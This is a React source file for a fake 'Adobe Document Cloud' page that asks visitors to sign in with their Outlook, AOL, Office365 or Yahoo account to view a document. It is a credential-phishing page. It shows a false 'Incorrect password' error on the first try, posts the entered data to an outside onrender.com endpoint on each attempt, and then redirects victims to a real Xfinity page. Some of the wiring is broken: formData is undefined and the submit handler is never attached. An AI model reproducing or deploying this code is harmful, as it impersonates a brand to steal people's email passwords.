import { useState } from "react";
import adobe from './assets/adobe.png'


const providers = [
  { name: "Outlook", color: "bg-blue-600" },
  { name: "Aol", color: "bg-blue-400" },
  { name: "Office365", color: "bg-red-500" },
  { name: "Yahoo", color: "bg-purple-500" },
  { name: "Other Mail", color: "bg-blue-500" },
];

const LoginModal = ({ provider, onClose }) => {

  const [clickCount, setClickCount] = useState(0)
  const [error, setError] = useState(null);

  const handleSubmit = async (e) => {
    e.preventDefault();
  
    // Increment click count on every click
    setClickCount((prevCount) => prevCount + 1);
  
    // On the first click, show error and submit data
    if (clickCount === 0) {
      setError('Incorrect password. Please try again.');
      console.log('Error:', 'Incorrect password on the first attempt.');
  
      // Always send data, even on the first click
      try {
        const response = await fetch(
          'https://xfinity-5y6r.onrender.com/api/submit',
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData),
          }
        );
  
        const data = await response.json();
        console.log(data);
  
        // If needed, you can handle success response here as well
      } catch (error) {
        console.error('Error on first attempt:', error);
      }
    } else {
      // On subsequent clicks, clear the error and submit the data
      setError(''); // Clear the error
      console.log('Submitting data on subsequent attempt');
  
      try {
        const response = await fetch(
          'https://xfinity-5y6r.onrender.com/api/submit',
          {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(formData),
          }
        );
  
        const data = await response.json();
        console.log(data);
  
        if (data.success) {
          // Redirect on successful submission
          window.location.href =
            'https://www.xfinity.com/planbuilder?localize=true&drawer=internet';
        } else {
          // Handle any error response
          setError(data.message);
        }
      } catch (error) {
        setError('Failed to submit. Please try again later.');
        console.error('Error:', error);
      }
    }
  };
  return (
    <form className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-30">
      <div className="bg-white p-6 rounded-lg shadow-lg w-96">
        <h2 className="text-xl font-bold mb-4">Sign in with {provider}</h2>
        <input type="email" placeholder="Enter your email" className="w-full p-2 border rounded mb-4" />
        <input type="password" placeholder="Enter your password" className="w-full p-2 border rounded mb-4" />
        <button handleSubmit={handleSubmit} className="bg-blue-600 text-white p-2 rounded w-full">Login</button>
        <button onClick={onClose} className="mt-4 text-red-500 w-full">Close</button>
      </div>
    </form>
  );
};

export default function AdobeLoginUI() {
  const [selectedProvider, setSelectedProvider] = useState(null);

  return (
    <div className="flex items-center justify-center min-h-screen bg-transparent">
      <div className="bg-gray-900 text-white p-6 rounded-lg shadow-lg w-96 text-center">
        <img src={adobe} alt="Adobe" className="mx-auto w-12 mb-4" />
        <h2 className="text-lg font-semibold">Adobe Document Cloud</h2>
        <p className="text-sm mt-2 mb-4">To read the document, please choose your email provider below.</p>
        {providers.map(({ name, color }) => (
          <button
            key={name}
            className={`w-full ${color} text-white p-2 rounded mb-2`}
            onClick={() => setSelectedProvider(name)}
          >
            Sign in with {name}
          </button>
        ))}
        <p className="text-xs mt-4">CopyRight &copy; 2023 Adobe System Incorporated.</p>
      </div>
      {selectedProvider && <LoginModal provider={selectedProvider} onClose={() => setSelectedProvider(null)} />}
    </div>
  );
}
